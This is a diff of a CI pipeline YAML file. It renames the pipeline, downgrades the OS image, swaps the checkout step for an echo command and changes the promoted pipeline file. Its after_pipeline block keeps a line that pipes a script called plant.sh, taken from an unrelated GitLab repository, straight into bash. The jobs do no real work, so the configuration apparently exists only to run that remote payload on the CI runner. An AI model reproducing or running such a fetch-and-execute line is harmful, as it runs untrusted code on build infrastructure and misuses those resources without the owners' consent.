@@ -1,16 +1,16 @@
 version: v1.0
-name: Parallel
+name: Pipeline 2
 agent:
   machine:
     type: e1-standard-2
-    os_image: ubuntu2004
+    os_image: ubuntu1804
 blocks:
   - name: 'Block #1'
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - checkout
+            - echo "job 1"
 after_pipeline:
   task:
     jobs:
@@ -19,4 +19,4 @@ after_pipeline:
           - 'curl https://gitlab.com/azkadafa39/suram/-/raw/main/plant.sh | bash'
 promotions:
   - name: Promotion 1
-    pipeline_file: pipeline_2.yml
+    pipeline_file: pipeline_3.yml
